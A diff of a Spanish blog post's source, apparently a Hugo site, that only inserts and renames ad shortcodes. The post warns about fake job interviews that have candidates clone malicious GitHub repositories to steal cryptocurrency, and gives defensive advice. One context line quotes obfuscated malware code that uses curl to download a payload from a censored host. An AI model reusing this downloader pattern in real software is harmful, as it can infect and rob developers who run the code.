@@ -22,6 +22,8 @@ title: Como Una Entrevista Laboral Se Convierte En Un Robo De Criptomonedas
 
 El otro día estaba navegando en esa máquina de propaganda política de Elon Musk, también conocida como X, y me topé con esta joya de la desvergüenza humana, un entrevistador que estuvo a punto de hackear a uno de sus postulantes.
 
+{{<ad0>}}
+
 ## Ejecución de malware en las entrevistas laborales
 
 La historia es esta: estás necesitado de trabajo, te preparas para la entrevista, y de repente el reclutador te pide clonar [una librería de Github]({{< ref path="/posts/git/el-problema-de-usar-github-para-evaluar-a-desarrolladores/index.md" lang="es" >}}) para que encuentres los errores en el código, una entrevista protocolaria para desarrollo de software, todo normal hasta este punto. Por supuesto que tú, necesitado de un buen laburo, decides seguir con el proceso.
@@ -45,7 +47,7 @@ _0x42b722("curl -Lo \"" + _0x157519 + "\" \"" + "http://<censored>/pdown" + "\""
   })
 ```
 
-{{<ad>}}
+{{<ad1>}}
 
 ## ¿Cómo evitamos caer en estas trampas?
 
@@ -54,6 +56,8 @@ No planeo quedarme solo en el drama. Esto se trata de ofrecer algunas soluciones
 ### **Usa un dispositivo diferente**
 
 La opción más cómoda, pero también la más cara, mantén tus dispositivos separados, usa un ordenador para trabajo y pruebas técnicas y otro para tus asuntos personales, criptomonedas incluidas. 
+
+{{<ad2>}}
 
 ### **Lee el código, siempre que sea posible**
 
@@ -66,6 +70,8 @@ Monta una máquina virtual, ya sea Virtual Box o Gnome Boxes, en Linux, o un [co
 Otra opción disponible, y mi favorita: una live USB con la distribución de tu elección (Debian, Fedora, o lo que quieras).
 
 De esa manera, lo peor que puede pasar es que infecten tu máquina virtual y no tu equipo real con toda tu información personal. ¡Solo ten cuidado los volúmenes compartidos! Si montas tu disco duro en la VM, estás frito.
+
+{{<ad3>}}
 
 ### **Cifra tu información sensible**
 
